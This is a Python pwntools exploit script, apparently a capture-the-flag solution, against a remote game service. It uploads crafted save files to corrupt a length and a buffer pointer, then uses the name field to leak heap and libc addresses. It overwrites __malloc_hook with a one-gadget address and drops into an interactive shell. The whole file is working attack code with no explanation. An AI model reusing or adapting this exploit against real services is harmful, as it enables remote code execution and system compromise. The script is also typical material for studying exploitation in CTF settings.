#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888

r = remote(host,port)
r.recvuntil(":")
r.sendline("\x00ddaa")
writetime = 0

def play():
    r.recvuntil(">")
    r.sendline("1")
    r.sendline("p\x0d")

def upload(data):
    r.recvuntil(">")
    r.sendline("3")
    r.send(data)

def savegame():
    r.recvuntil(">")
    r.sendline("1")
    r.sendline("p")

def loadgame():
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(">")
    r.sendline("1")

def changename(name):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.send(name)
    r.recvuntil(">")
    r.sendline("3")

def showname():
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("Name: ")
    name = r.recvuntil("\n")[:-1]
    r.recvuntil(">")
    r.sendline("3")
    return name

def overwritelen(value,value2):
    global writetime
    lenoffset = - (0x440+0x3c+ 0x240*writetime)/2 % 0x100000000
    data = "SNKG"
    data += p32(0x100)
    data += p32(0x60)
    data += p32(0x101)
    data = data.ljust(0x33,"\x00")
    data += '\x01' 
    data += p32(0) + p32(0)
    data += p32(0x0)
    data = data.ljust(0x60,"\x00")
    game = p32(0xddccbbaa) + p32(0x30d40) + "a"*0x20
    game = game.ljust(0x28,"\x00")
    game += p32(0x9)
    game = game.ljust(0x4c,"\x00")
    game += p16(0x19)
    game += p16(0x64)
    game += p32(0)
    game += p32(4)
    game += p32(lenoffset)
    game += p32(value) #writebyte1
    game += p32(value2) # writebyte2
    game = game.ljust(0x148,"\x00")
    upload(data)
    r.send(game*1)
    writetime += 1


def overwritebuf(value,value2,off):
    global writetime
    bufoffset =  - (0x448+0x3c + writetime*0x240 - off)/2 % 0x100000000
    data = "SNKG"
    data += p32(0x100)
    data += p32(0x60)
    data += p32(0x101)
    data = data.ljust(0x33,"\x00")
    data += '\x01' 
    data += p32(0) + p32(0)
    data += p32(0x0)
    data = data.ljust(0x60,"\x00")
    game = p32(0xddccbbaa) + p32(0x30d40) + "a"*0x20
    game = game.ljust(0x28,"\x00")
    game += p32(0x9)
    game = game.ljust(0x4c,"\x00")
    game += p16(0x19)
    game += p16(0x64)
    game += p32(0)
    game += p32(4)
    game += p32(bufoffset)
    game += p32(value) #writebyte1
    game += p32(value2) # writebyte2
    game = game.ljust(0x148,"\x00")
    upload(data)
    r.send(game*1)
    writetime += 1


play()
overwritelen(0x38,0)
changename("a"*0x38)
data = showname()
heapbase = u64(data[-6:].ljust(8,"\x00")) - 0x190 - 0x1010
print "heap:",hex(heapbase)
changename("a"*0x20 + p64(0) + p64(0x31)+p64(0))
leakaddr = heapbase + 0x1780
overwritebuf(leakaddr & 0xff ,(leakaddr >> 8) & 0xff,0)
data = showname()
libc = u64(data[-6:].ljust(8,"\x00")) - 0x3c3b78
print "libc:",hex(libc)
malloc_hook = libc + 0x3c3b10 
magic = libc + 0xf5b10 
overwritebuf(malloc_hook & 0xff , (malloc_hook >> 8) & 0xff,0)
overwritebuf( (malloc_hook >> 8*2) & 0xff , (malloc_hook >> 8*3) & 0xff,2)
overwritebuf( (malloc_hook >> 8*4) & 0xff , (malloc_hook >> 8*5) & 0xff,4)
changename(p64(magic) + "\n")
loadgame()
r.interactive()
